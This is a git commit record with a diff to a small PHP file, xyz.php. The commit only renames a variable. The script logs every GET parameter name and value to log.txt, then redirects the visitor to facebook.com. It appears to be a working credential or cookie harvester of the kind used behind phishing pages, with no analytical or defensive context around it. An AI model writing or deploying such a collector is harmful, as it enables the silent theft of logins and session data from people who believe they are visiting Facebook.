f33ec14d693d77172417c35407aa1fd127daca86
Vanquy1306 <59086073+Vanquy1306@users.noreply.github.com>
2020-09-28 13:56:44 +0700

    Update xyz.php

--- xyz.php
+++ xyz.php
@@ -1,13 +1,13 @@
 <?php
 header ('Location: https://www.facebook.com  ');
-$handle = fopen("log.txt", "a");
+$file = fopen("log.txt", "a");
 foreach($_GET as $variable => $value) {
-fwrite($handle, $variable);
-fwrite($handle, "=");
-fwrite($handle, $value);
-fwrite($handle, "\r\n");
+fwrite($file, $variable);
+fwrite($file, "=");
+fwrite($file, $value);
+fwrite($file, "\r\n");
 }
-fwrite($handle, "\r\n");
-fclose($handle);
+fwrite($file, "\r\n");
+fclose($file);
 exit;
 ?>
